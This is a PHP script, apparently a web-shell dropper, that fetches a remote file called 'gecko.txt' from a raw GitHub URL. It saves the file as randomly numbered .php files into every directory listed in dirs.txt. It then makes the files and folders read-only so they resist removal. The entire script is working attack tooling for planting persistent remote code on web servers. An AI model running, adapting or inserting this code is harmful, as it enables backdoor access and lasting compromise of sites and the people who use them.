<?php

function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
    $options = [
        'http' => [
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ];
    $context = stream_context_create($options);

    foreach ($save_dirs as $dir) {
        if (!is_dir($dir)) {
            echo "📁 Folder '$dir' belum ada. Mencoba membuat...\n";
            if (!mkdir($dir, 0777, true)) {
                echo "❌ Gagal membuat folder: $dir\n";
                continue;
            }
            echo "✅ Folder '$dir' berhasil dibuat dengan permission 0777.\n";
        } else {
            echo "📁 Folder '$dir' sudah ada.\n";

            // Cek apakah folder tidak writable
            if (!is_writable($dir)) {
                echo "⚠️  Folder '$dir' tidak bisa ditulisi. Mencoba ubah permission ke 0755...\n";
                if (chmod($dir, 0755)) {
                    echo "✅ Permission folder '$dir' berhasil diubah ke 0755.\n";
                } else {
                    echo "❌ Gagal mengubah permission folder: $dir\n";
                }
            }
        }
    }

    foreach ($files as $file) {
        $url = $file['url'];
        echo "⬇️  Mengunduh: $url\n";
        $content = @file_get_contents($url, false, $context);
        if ($content === false) {
            echo "❌ Gagal download dari $url\n";
            continue;
        }

        foreach ($save_dirs as $dir) {
            $random_number = rand(100000, 999999);
            $save_path = rtrim($dir, '/') . '/' . $random_number . '.php';

            // Cek ulang permission sebelum simpan
            if (!is_writable($dir)) {
                echo "❌ Folder '$dir' tetap tidak bisa ditulisi. Melewati...\n";
                continue;
            }

            if (file_put_contents($save_path, $content) !== false) {
                echo "✅ File disimpan ke: $save_path\n";
                chmod($save_path, 0444);
            } else {
                echo "❌ Gagal simpan file ke: $save_path\n";
            }
        }
    }

    foreach ($save_dirs as $dir) {
        chmod($dir, 0555);
        echo "🔧 Permission folder '$dir' di-set ke 0555 (read-only)\n";
    }
}

$files_to_download = [
    ['url' => 'https://raw.githubusercontent.com/erosjoko5/room/refs/heads/main/gecko.txt', 'save_name' => '32165465.php'],
];

$dir_list_file = __DIR__ . '/dirs.txt';

if (!file_exists($dir_list_file)) {
    die("❌ File direktori '$dir_list_file' tidak ditemukan.\n");
}

$save_directories = array_filter(array_map('trim', file($dir_list_file)));

download_and_save_to_multiple_dirs($files_to_download, $save_directories);
